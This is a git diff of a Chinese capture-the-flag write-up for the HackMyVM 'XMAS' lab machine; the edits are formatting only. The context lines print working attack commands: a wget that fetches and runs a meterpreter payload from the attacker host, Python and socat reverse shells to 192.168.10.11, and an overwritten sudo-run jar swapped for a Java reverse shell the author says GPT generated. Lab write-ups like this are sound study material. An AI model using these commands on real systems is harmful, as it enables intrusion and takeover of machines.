@@ -3,11 +3,11 @@ title: XMAS
 tags:
   - sec/hackmyvm
 date: 2024-02-14T17:08:44
-lastmod: 2024-11-24T18:55:58
+lastmod: 2024-11-24T19:08:29
 toc: "true"
 ---
 ## 靶机, 启动
-```
+```bash
 192.168.10.16
 ```
 ## 端口扫描
@@ -21,14 +21,17 @@ toc: "true"
 ![HMM_XMAS_image_3](https://img.l1uyun.one/HMM_XMAS_image_3.png)
 
 在主页的下面发现了一个上传点, 直接上传反弹 shell
+
 ![HMM_XMAS_image_4](https://img.l1uyun.one/HMM_XMAS_image_4.png)
 
 使用 nc 失败, 换成了 webshell
+
 ![HMM_XMAS_image_5](https://img.l1uyun.one/HMM_XMAS_image_5.png)
 
 ![HMM_XMAS_image_6](https://img.l1uyun.one/HMM_XMAS_image_6.png)
 然后还是用了 meterpreter
-```
+
+```bash
 wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&&chmod 777 /tmp/shell.elf
 ```
 ## www-data ,进一步收集信息
@@ -39,7 +42,7 @@ wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf&&chmod 777 /tmp/shell
 ![HMM_XMAS_image_8](https://img.l1uyun.one/HMM_XMAS_image_8.png)
 
 
-```
+```bash
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.11",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > nice_or_naughty.py
 
 
@@ -50,7 +53,7 @@ echo 'import subprocess; subprocess.call(["/tmp/newshell.elf"])' > nice_or_naugh
 ![HMM_XMAS_image_9](https://img.l1uyun.one/HMM_XMAS_image_9.png)
 
 上传一个 socat 二进制文件上去算了
-```
+```bash
 echo 'import subprocess; subprocess.call(["/tmp/socat", "TCP:192.168.10.11:4445", "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"])' > nice_or_naughty.py
 ```
 还是不行
@@ -66,7 +69,7 @@ echo 'import subprocess; subprocess.call(["/tmp/socat", "TCP:192.168.10.11:4445"
 
 利用 sudo 涉及的文件可写, 用 gpt 生成了个 java 的反弹 shell
 
-```
+```bash
 ## 编译成java字节码
 javac ReverseShell.java
 
@@ -80,7 +83,8 @@ jar cfm ReverseShell.jar Manifest.txt ReverseShell.class
 ```
 
 ![HMM_XMAS_image_13](https://img.l1uyun.one/HMM_XMAS_image_13.png)
-```
+
+```bash
 cd /tmp 
 wget http://192.168.10.11:8000/ReverseShell.jar
 cp ReverseShell.jar /home/alabaster/PublishList/PublishList.jar
